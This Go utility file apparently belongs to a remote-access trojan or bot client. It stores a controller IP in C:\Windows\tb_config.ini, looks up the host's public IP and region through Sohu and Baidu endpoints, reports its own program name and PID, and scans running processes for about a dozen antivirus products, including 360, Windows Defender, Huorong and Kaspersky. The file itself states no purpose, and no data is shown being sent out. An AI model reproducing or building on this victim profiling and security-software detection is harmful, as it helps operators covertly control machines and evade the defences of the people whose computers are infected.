package util

import (
	"bufio"
	"fmt"
	"github.com/go-ini/ini"
	"github.com/shirou/gopsutil/process"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func WriteConfigFile(filePath, section, content string) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)

	// 写入配置部分
	_, err = writer.WriteString(section + "\n")
	if err != nil {
		return err
	}

	// 写入配置内容
	_, err = writer.WriteString("IP:" + content + "\n")
	if err != nil {
		return err
	}

	err = writer.Flush()
	if err != nil {
		return err
	}

	return nil
}

func UpdateConfigFile(value string) error {
	cfg, err := ini.Load("C:\\Windows\\tb_config.ini")
	if err != nil {
		return fmt.Errorf("failed to load config file: %v", err)
	}

	cfg.Section("IpAndPort").Key("IP").SetValue(value)

	err = cfg.SaveTo("C:\\Windows\\tb_config.ini")
	if err != nil {
		return fmt.Errorf("failed to save config file: %v", err)
	}

	return nil
}
func GetIP() string {
	str := ""
	resp, err := http.Get("http://txt.go.sohu.com/ip/soip")
	if err != nil {
		str = "127.0.0.1"
		return str
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		str = "127.0.0.1"
		return str
	}

	str = string(body)
	startIndex := strings.Index(str, "window.sohu_user_ip") + 21
	endIndex := strings.Index(str, ";sohu_IP_Loc")

	return str[startIndex:endIndex]
}

func GetRegion(IP string) string {
	str := ""
	url := "http://opendata.baidu.com/api.php?query=" + IP + "&co=&resource_id=6006&oe=utf8"

	resp, err := http.Get(url)
	if err != nil {
		str = "未知"
		return str
	}

	defer resp.Body.Close()

	bytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		str = "未知"
		return str
	}

	str = string(bytes)

	return str[strings.Index(str, "location")+11 : strings.Index(str, "origip")-3]
}

func GetCurrentGoProgramName() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", err
	}

	goProgramName := filepath.Base(exePath)
	return goProgramName, nil
}
func GetCurrentPID() string {
	return fmt.Sprintf("%d", os.Getpid())
}

func GetSecuritySoftware() string {
	processes, err := process.Processes()
	if err != nil {
		fmt.Println("Failed to get processes:", err)
		return "无"
	}

	exe := ""
	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			fmt.Println("Failed to get process name:", err)
			continue
		}

		if containsString(name, "360tray") {
			exe += "360安全卫士|"
		} else if containsString(name, "360sd") {
			exe += "360杀毒|"
		} else if containsString(name, "MsMpEng") {
			exe += "Windows Defender|"
		} else if containsString(name, "HipsTray") {
			exe += "火绒|"
		} else if containsString(name, "ksafe") {
			exe += "金山卫士|"
		} else if containsString(name, "QQPCRTP") {
			exe += "电脑管家|"
		} else if containsString(name, "kxetray") {
			exe += "金山毒霸|"
		} else if containsString(name, "RavMonD") {
			exe += "瑞星|"
		} else if containsString(name, "avp") {
			exe += "卡巴斯基|"
		} else if containsString(name, "avcenter") {
			exe += "小红伞|"
		} else if containsString(name, "rtvscan") {
			exe += "诺顿|"
		}
	}
	if exe == "" {
		exe = "无"
	}

	return exe
}

func containsString(s, substr string) bool {
	return strings.Contains(strings.ToLower(s), strings.ToLower(substr))
}
